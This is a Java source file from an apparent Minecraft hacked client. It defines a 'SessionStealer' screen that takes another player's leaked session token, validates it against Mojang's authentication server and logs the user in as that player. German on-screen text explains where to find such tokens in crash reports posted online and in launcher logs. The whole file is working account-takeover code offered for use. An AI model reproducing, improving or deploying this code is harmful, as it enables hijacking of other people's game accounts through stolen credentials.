package de.crazymemecoke.features.ui.guiscreens;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import de.crazymemecoke.Client;
import de.crazymemecoke.utils.JSONUtil;
import net.minecraft.client.gui.*;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.Session;
import org.lwjgl.input.Keyboard;

import java.awt.*;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;

public class SessionStealer extends GuiScreen {
	protected GuiScreen prevMenu;
	protected GuiTextField tokenBox;

	protected String errorText = "";
	protected String helpText = "";

	public SessionStealer(GuiScreen parentScreen) {
		prevMenu = parentScreen;
	}

	/**
	 * Called from the main game loop to update the screen.
	 */
	@Override
	public void updateScreen() {
		tokenBox.updateCursorCounter();
	}

	/**
	 * Adds the buttons (and other controls) to the screen in question.
	 */
	@SuppressWarnings("unchecked")
	@Override
	public void initGui() {
		Keyboard.enableRepeatEvents(true);
		buttonList.clear();
		buttonList.add(new GuiButton(0, width / 2 - 100, height / 4 + 62, "Diese ID benutzen"));
		buttonList.add(new GuiButton(1, width / 2 - 100, height / 4 + 96 + 200, "Zurück"));
		tokenBox = new GuiTextField(1, fontRendererObj, width / 2 - 100, height / 4 + 40, 200, 20);
		tokenBox.setMaxStringLength(65);
		tokenBox.setFocused(false);
		tokenBox.setCanLoseFocus(true);
		tokenBox.setText("");
	}

	@Override
	public void onGuiClosed() {
		Keyboard.enableRepeatEvents(false);
	}

	@Override
	protected void actionPerformed(GuiButton button) {
		if (button.enabled)
			if (button.id == 1)
				this.mc.displayGuiScreen(new ClientMenu());
			else if (button.id == 0) {
				String input = tokenBox.getText();
				if (input.length() != 65 || !input.startsWith(":", 32) || input.split(":").length != 2) {
					errorText = "That is not a session token!";
					return;
				}
				String uuid = input.split(":")[1];
				if (uuid.contains("-")) {
					errorText = "That is not a session token!";
					helpText = "Try without the dashes (-).";
					return;
				}

				JsonElement rawJson;
				try {
					rawJson = JSONUtil.jsonParser.parse(
							new InputStreamReader(new URL("https://api.mojang.com/user/profiles/" + uuid + "/names")
									.openConnection().getInputStream()));
				} catch (Exception e) {
					e.printStackTrace();
					errorText = "Mojang servers might be down.";
					return;
				}

				if (!rawJson.isJsonArray()) {
					errorText = "Session ID is fake.";
					return;
				}

				JsonArray json = rawJson.getAsJsonArray();
				String name = json.get(json.size() - 1).getAsJsonObject().get("name").getAsString();

				try {
					Proxy proxy = MinecraftServer.getServer() == null ? null
							: MinecraftServer.getServer().getServerProxy();
					if (proxy == null)
						proxy = Proxy.NO_PROXY;

					HttpURLConnection connection = (HttpURLConnection) new URL("https://authserver.mojang.com/validate")
							.openConnection(proxy);

					connection.setRequestMethod("POST");
					connection.setRequestProperty("Content-Type", "application/json");

					String content = "{\"accessToken\":\"" + input.split(":")[0] + "\"}";

					connection.setRequestProperty("Content-Length", "" + content.getBytes().length);
					connection.setRequestProperty("Content-Language", "en-US");
					connection.setUseCaches(false);
					connection.setDoInput(true);
					connection.setDoOutput(true);

					DataOutputStream output = new DataOutputStream(connection.getOutputStream());
					output.writeBytes(content);
					output.flush();
					output.close();

					if (connection.getResponseCode() != 204)
						throw new IOException();
				} catch (IOException e) {
					errorText = "Invalid Session";
					helpText = "This token doesn't work anymore. Try a different one.";
					return;
				}

				// use session
				mc.session = new Session(name, uuid, input.split(":")[0], "mojang");
				mc.displayGuiScreen(new GuiMainMenu());
			}
	}

	@Override
	protected void keyTyped(char par1, int par2) {
		tokenBox.textboxKeyTyped(par1, par2);

		if (par2 == 28 || par2 == 156)
			actionPerformed((GuiButton) buttonList.get(0));
	}

	@Override
	protected void mouseClicked(int par1, int par2, int par3) throws IOException {
		super.mouseClicked(par1, par2, par3);
		tokenBox.mouseClicked(par1, par2, par3);
	}

	@Override
	public void drawScreen(int par1, int par2, float par3) {
		drawDefaultBackground();
		drawString(this.mc.fontRendererObj, "", width / 2 - 100, 79, 10526880);
		ScaledResolution s = new ScaledResolution(this.mc);
		Gui.drawRect(0, 0, s.getScaledWidth(), s.getScaledHeight(), new Color(28, 26, 28).getRGB());

		Client.getInstance().getFontManager().comfortaa20.drawString("Session ID's kannst du online in Minecraft Crash Reports finden.\n"
				+ "Suche einfach mit der Suchmaschine deiner Wahl nach \"Minecraft Session ID is token\".\n"
				+ "Die dort enthaltene ID hat immer 65 Zeichen und sieht beispielsweise so aus:\n"
				+ "[Client thread/INFO]: (Session ID is token:d605342c8b3a4794aab9462d0eb2b43e:ceda67c83c754af0b1207f4c52122643)\n"
				+ "\n"
				+ "In neueren Launchern von Minecraft wird die Session ID im Log ausgeblendet und kann nur noch\n"
				+ "im .minecraft-Ordner unter \"launcher-log.txt\" gefunden werden.", 2, 2, 0xFFFFFF);
		Client.getInstance().getFontManager().comfortaa20.drawString("Session ID is token:", s.getScaledWidth() / 2 + 35, s.getScaledHeight() / 2 - 44, 0xFFFFFF);

		tokenBox.drawTextBox();

		super.drawScreen(par1, par2, par3);
	}
}
